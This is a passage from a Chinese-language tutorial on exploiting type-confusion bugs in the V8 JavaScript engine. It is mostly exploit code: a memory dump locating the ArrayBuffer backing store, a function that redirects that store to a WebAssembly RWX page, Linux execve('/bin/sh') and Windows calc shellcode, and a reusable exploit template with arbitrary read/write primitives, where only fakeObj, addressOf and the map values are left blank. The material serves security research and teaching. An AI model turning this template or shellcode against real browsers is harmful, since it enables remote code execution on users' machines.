看看`backing_store`字段在`data_buf`变量结构中的位置：
    pwndbg> x/16gx 0x2ead0804970d-1
    0x2ead0804970c: 0x0800222d08203271 0x000000100800222d
    0x2ead0804971c: 0x0000000000000000 0x12bb905000000000
    0x2ead0804972c: 0x12bb90b00000555c 0x000000020000555c
    0x2ead0804973c: 0x0000000000000000 0x0000000000000000
    0x2ead0804974c: 0x0800222d08202ca9 0x0804970d0800222d
    0x2ead0804975c: 0x0000000000000000 0x0000000000000010
    0x2ead0804976c: 0x0000555c12bb9050 0x0000000000000000
    0x2ead0804977c: 0x0000000000000000 0x0000000000000000
发现`backing_store`的地址属于`data_buf +
0x1C`，这个偏移在不同版本的v8中也是有一些区别的，所以写exp的时候，可以根据上面的步骤来进行计算。
根据上述的思路，我们可以写出`copy_shellcode_to_rwx`函数：
    function copy_shellcode_to_rwx(shellcode, rwx_addr)
    {
      var data_buf = new ArrayBuffer(shellcode.length * 8);
      var data_view = new DataView(data_buf);
      var buf_backing_store_addr_lo = addressOf(data_buf) + 0x18n;
      var buf_backing_store_addr_up = buf_backing_store_addr_lo + 0x8n;
      var lov = d2u(read64(buf_backing_store_addr_lo))[0];
      var rwx_page_addr_lo = u2d(lov, d2u(rwx_addr)[0]);
      var hiv = d2u(read64(buf_backing_store_addr_up))[1];
      var rwx_page_addr_hi = u2d(d2u(rwx_addr, hiv)[1]);
      var buf_backing_store_addr = ftoi(u2d(lov, hiv));
      console.log("buf_backing_store_addr: 0x"+hex(buf_backing_store_addr));
      write64(buf_backing_store_addr_lo, ftoi(rwx_page_addr_lo));
      write64(buf_backing_store_addr_up, ftoi(rwx_page_addr_hi));
      for (let i = 0; i < shellcode.length; ++i)
        data_view.setFloat64(i * 8, itof(shellcode[i]), true);
    }
# 利用
在linux环境下，我们测试的时候想执行一下`execve(/bin/sh,0,0)`的shellcode，就可以这样：
    var shellcode = [
      0x2fbb485299583b6an,
      0x5368732f6e69622fn,
      0x050f5e5457525f54n
    ];
    copy_shellcode_to_rwx(shellcode, rwx_page_addr);
    f();
如果想执行windows的弹计算器的shellcode，代码只需要改shellcode变量的值就好了，其他的就不用修改了：
    var shellcode = [
        0xc0e8f0e48348fcn,
        0x5152504151410000n,
        0x528b4865d2314856n,
        0x528b4818528b4860n,
        0xb70f4850728b4820n,
        0xc03148c9314d4a4an,
        0x41202c027c613cacn,
        0xede2c101410dc9c1n,
        0x8b20528b48514152n,
        0x88808bd001483c42n,
        0x6774c08548000000n,
        0x4418488b50d00148n,
        0x56e3d0014920408bn,
        0x4888348b41c9ff48n,
        0xc03148c9314dd601n,
        0xc101410dc9c141acn,
        0x244c034cf175e038n,
        0x4458d875d1394508n,
        0x4166d0014924408bn,
        0x491c408b44480c8bn,
        0x14888048b41d001n,
        0x5a595e58415841d0n,
        0x83485a4159415841n,
        0x4158e0ff524120ecn,
        0xff57e9128b485a59n,
        0x1ba485dffffn,
        0x8d8d480000000000n,
        0x8b31ba4100000101n,
        0xa2b5f0bbd5ff876fn,
        0xff9dbd95a6ba4156n,
        0x7c063c28c48348d5n,
        0x47bb0575e0fb800an,
        0x894159006a6f7213n,
        0x2e636c6163d5ffdan,
        0x657865n,
    ];
    copy_shellcode_to_rwx(shellcode, rwx_page_addr);
    f();
# 其他
在上面的示例代码中，出现了几个没说明的函数，以下是这几个函数的代码：
    var f64 = new Float64Array(1);
    var bigUint64 = new BigUint64Array(f64.buffer);
    var u32 = new Uint32Array(f64.buffer);
    function ftoi(f)
    {
      f64[0] = f;
        return bigUint64[0];
    }
    function itof(i)
    {
        bigUint64[0] = i;
        return f64[0];
    }
    function u2d(lo, hi) {
      u32[0] = lo;
      u32[1] = hi;
      return f64[0];
    }
    function d2u(v) {
      f64[0] = v;
      return u32;
    }
因为在上述思路中，都是使用浮点型数组，其值为浮点型，但是浮点型的值我们看着不顺眼，设置值我们也是习惯使用十六进制值。所以需要有`ftoi`和`itof`来进行浮点型和64bit的整数互相转换。
但是因为在新版的v8中，有压缩高32bit地址的特性，所以还需要`u2d`和`d2u`两个，把浮点型和32bit整数进行互相转换的函数。
最后还有一个`hex`函数，就是方便我们查看值：
    function hex(i)
    {
        return i.toString(16).padStart(8, "0");
    }
# 总结
目前在我看来，不说所有v8的漏洞，但是所有类型混淆类的漏洞都能使用同一套模板：
    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
    var f = wasmInstance.exports.main;
    var f64 = new Float64Array(1);
    var bigUint64 = new BigUint64Array(f64.buffer);
    var u32 = new Uint32Array(f64.buffer);
    function d2u(v) {
      f64[0] = v;
      return u32;
    }
    function u2d(lo, hi) {
      u32[0] = lo;
      u32[1] = hi;
      return f64[0];
    }
    function ftoi(f)
    {
      f64[0] = f;
        return bigUint64[0];
    }
    function itof(i)
    {
        bigUint64[0] = i;
        return f64[0];
    }
    function hex(i)
    {
        return i.toString(16).padStart(8, "0");
    }
    function fakeObj(addr_to_fake)
    {
        ?
    }
    function addressOf(obj_to_leak)
    {
        ?
    }
    function read64(addr)
    {
        fake_array[1] = itof(addr - 0x8n + 0x1n);
        return fake_object[0];
    }
    function write64(addr, data)
    {
        fake_array[1] = itof(addr - 0x8n + 0x1n);
        fake_object[0] = itof(data);
    }
    function copy_shellcode_to_rwx(shellcode, rwx_addr)
    {
      var data_buf = new ArrayBuffer(shellcode.length * 8);
      var data_view = new DataView(data_buf);
      var buf_backing_store_addr_lo = addressOf(data_buf) + 0x18n;
      var buf_backing_store_addr_up = buf_backing_store_addr_lo + 0x8n;
      var lov = d2u(read64(buf_backing_store_addr_lo))[0];
      var rwx_page_addr_lo = u2d(lov, d2u(rwx_addr)[0]);
      var hiv = d2u(read64(buf_backing_store_addr_up))[1];
      var rwx_page_addr_hi = u2d(d2u(rwx_addr, hiv)[1]);
      var buf_backing_store_addr = ftoi(u2d(lov, hiv));
      console.log("[*] buf_backing_store_addr: 0x"+hex(buf_backing_store_addr));
      write64(buf_backing_store_addr_lo, ftoi(rwx_page_addr_lo));
      write64(buf_backing_store_addr_up, ftoi(rwx_page_addr_hi));
      for (let i = 0; i < shellcode.length; ++i)
        data_view.setFloat64(i * 8, itof(shellcode[i]), true);
    }
    var double_array = [1.1];
    var obj = {"a" : 1};
    var obj_array = [obj];
    var array_map = ?;
    var obj_map = ?;
    var fake_array = [
      array_map,
      itof(0x4141414141414141n)
    ];
    fake_array_addr = addressOf(fake_array);
    console.log("[*] leak fake_array addr: 0x" + hex(fake_array_addr));
    fake_object_addr = fake_array_addr - 0x10n;
    var fake_object = fakeObj(fake_object_addr);
    var wasm_instance_addr = addressOf(wasmInstance);
    console.log("[*] leak wasm_instance addr: 0x" + hex(wasm_instance_addr));
    var rwx_page_addr = read64(wasm_instance_addr + 0x68n);
    console.log("[*] leak rwx_page_addr: 0x" + hex(ftoi(rwx_page_addr)));
    var shellcode = [
      0x2fbb485299583b6an,
      0x5368732f6e69622fn,
      0x050f5e5457525f54n
    ];
    copy_shellcode_to_rwx(shellcode, rwx_page_addr);
    f();
其中打问号的地方，需要根据具体情况来编写，然后就是有些偏移需要根据v8版本情况进行修改，但是主体结构基本雷同。
之后的文章中，打算把我最近研究复现的几个漏洞，套进这个模板中，来进行讲解。
* * *